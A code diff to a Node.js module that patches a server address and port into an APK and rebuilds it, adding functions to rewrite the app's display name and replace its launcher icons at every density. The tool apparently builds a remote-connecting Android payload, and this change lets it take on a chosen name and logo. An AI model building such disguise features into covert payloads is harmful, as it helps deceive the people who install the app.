@@ -1,7 +1,9 @@
 const
     cp = require('child_process'),
     fs = require('fs'),
-    CONST = require('./const');
+    path = require('path'),
+    CONST = require('./const'),
+    sharp = require('sharp');
 
 // Thanks -> https://stackoverflow.com/a/19734810/7594368
 // This function is a pain in the arse, so many issues because of it! -- hopefully this fix, fixes it!
@@ -40,6 +42,114 @@ function patchAPK(URI, PORT, cb) {
     }
 }
 
+/**
+ * Customize the app with a custom name and logo
+ * @param {string} appName - The custom app name
+ * @param {string} logoPath - Path to the custom logo image file (PNG)
+ * @param {function} cb - Callback function(error)
+ */
+function customizeApp(appName, logoPath, cb) {
+    try {
+        // Update app name in strings.xml
+        const stringsXmlPath = path.join(CONST.smaliPath, 'res', 'values', 'strings.xml');
+        updateAppName(stringsXmlPath, appName, (err) => {
+            if (err) return cb(`Failed to update app name: ${err}`);
+            
+            // If no logo provided, we're done
+            if (!logoPath) {
+                return cb(false);
+            }
+            
+            // Update app icons if logo is provided
+            updateAppIcons(logoPath, (err) => {
+                if (err) return cb(`Failed to update app icons: ${err}`);
+                
+                cb(false); // No error
+            });
+        });
+    } catch (e) {
+        return cb(`App customization error: ${e.message}`);
+    }
+}
+
+/**
+ * Update the app name in strings.xml
+ * @param {string} stringsXmlPath - Path to the strings.xml file
+ * @param {string} appName - The new app name
+ * @param {function} cb - Callback function(error)
+ */
+function updateAppName(stringsXmlPath, appName, cb) {
+    fs.readFile(stringsXmlPath, 'utf8', (err, data) => {
+        if (err) return cb(`Failed to read strings.xml: ${err.message}`);
+        
+        // Replace app_name string
+        const appNameRegex = /<string name="app_name">.*?<\/string>/;
+        const updatedData = data.replace(appNameRegex, `<string name="app_name">${appName}</string>`);
+        
+        fs.writeFile(stringsXmlPath, updatedData, 'utf8', (err) => {
+            if (err) return cb(`Failed to write strings.xml: ${err.message}`);
+            return cb(false);
+        });
+    });
+}
+
+/**
+ * Update app icons in all mipmap directories
+ * @param {string} logoPath - Path to the custom logo image file
+ * @param {function} cb - Callback function(error)
+ */
+function updateAppIcons(logoPath, cb) {
+    // Define mipmap directories and icon sizes
+    const mipmapDirs = [
+        { dir: 'mipmap-mdpi', size: 48 },
+        { dir: 'mipmap-hdpi', size: 72 },
+        { dir: 'mipmap-xhdpi', size: 96 },
+        { dir: 'mipmap-xxhdpi', size: 144 },
+        { dir: 'mipmap-xxxhdpi', size: 192 }
+    ];
+    
+    // Process each mipmap directory
+    let completedDirs = 0;
+    let hasError = false;
+    
+    mipmapDirs.forEach(({ dir, size }) => {
+        const iconPath = path.join(CONST.smaliPath, 'res', dir, 'ic_launcher.png');
+        
+        // Resize and save the logo for each density
+        resizeImage(logoPath, iconPath, size, (err) => {
+            if (hasError) return; // Skip if we already encountered an error
+            
+            if (err) {
+                hasError = true;
+                return cb(`Failed to update icon for ${dir}: ${err.message}`);
+            }
+            
+            completedDirs++;
+            if (completedDirs === mipmapDirs.length) {
+                // All icons have been processed
+                return cb(false);
+            }
+        });
+    });
+}
+
+/**
+ * Resize an image to the specified size and save it to the target path
+ * @param {string} sourcePath - Source image path
+ * @param {string} targetPath - Target image path
+ * @param {number} size - Target size (width and height)
+ * @param {function} cb - Callback function(error)
+ */
+function resizeImage(sourcePath, targetPath, size, cb) {
+    sharp(sourcePath)
+        .resize(size, size)
+        .png()
+        .toFile(targetPath, (err) => {
+            if (err) return cb(err);
+            return cb(false);
+        });
+}
+
 function buildAPK(cb) {
     javaversion(function (err, version) {
         if (!err) cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
@@ -55,5 +165,6 @@ function buildAPK(cb) {
 
 module.exports = {
     buildAPK,
-    patchAPK
+    patchAPK,
+    customizeApp
 }
